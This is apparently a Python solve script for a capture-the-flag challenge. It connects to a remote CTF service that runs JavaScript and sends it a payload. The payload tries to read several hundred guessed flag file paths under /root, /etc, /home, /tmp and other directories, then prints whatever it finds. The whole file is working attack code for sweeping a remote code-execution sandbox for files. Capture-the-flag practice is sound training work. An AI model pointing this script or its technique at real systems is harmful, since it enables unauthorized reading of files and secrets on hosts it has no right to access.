import json
import socket

HOST, PORT = 'ctf.vulnbydefault.com', 38871

base_dirs = [
    '/', '/root', '/home', '/tmp', '/opt', '/srv', '/var', '/usr/local',
    '/usr/local/share', '/var/tmp', '/run', '/etc', '/mnt', '/dev/shm',
    '/home/ctf', '/home/user', '/home/ubuntu', '/home/challenge',
    '/opt/challenge', '/srv/challenge', '/var/www'
]

subdirs = [
    '', 'challenge', 'chal', 'ctf', 'pwn', 'task', 'app', 'srv', 'files',
    'data', 'secret', 'hidden', 'home', 'root', 'tmp', 'run', 'var',
    'lib', 'bin', 'opt', 'workspace'
]

filenames = [
    'flag', 'flag.txt', 'FLAG', 'FLAG.txt', '.flag', 'flag1.txt',
    'flag_file', 'flagfile', 'secret.txt', 'ctf.flag', 'proof.txt',
    'readme.txt', 'note.txt', 'output.txt', 'result.txt'
]

cands = set()
for base in base_dirs:
    for sub in subdirs:
        d = (base.rstrip('/') + '/' + sub).replace('//', '/') if sub else base
        for fn in filenames:
            cands.add((d.rstrip('/') + '/' + fn).replace('//', '/'))

manual = [
    '/flag', '/flag.txt', '/FLAG', '/root/flag', '/root/flag.txt',
    '/home/ctf/flag', '/home/ctf/flag.txt', '/opt/flag', '/opt/flag.txt',
    '/srv/flag', '/srv/flag.txt', '/run/flag', '/run/flag.txt', '/etc/flag',
    '/etc/flag.txt', '/tmp/flag', '/tmp/flag.txt'
]
cands.update(manual)
cands = sorted(cands)

js = "const cands=" + json.dumps(cands) + ";\n"
js += "for (const p of cands){try{let x=read(p);print('FOUND '+p);print(String(x).slice(0,400));}catch(e){}}\n"

s = socket.create_connection((HOST, PORT), timeout=20)
s.recv(4096)
s.sendall((str(len(js)) + "\n").encode())
s.recv(4096)
s.sendall(js.encode())
s.shutdown(socket.SHUT_WR)

out = b''
while True:
    data = s.recv(262144)
    if not data:
        break
    out += data

print(out.decode('latin1', errors='replace'))
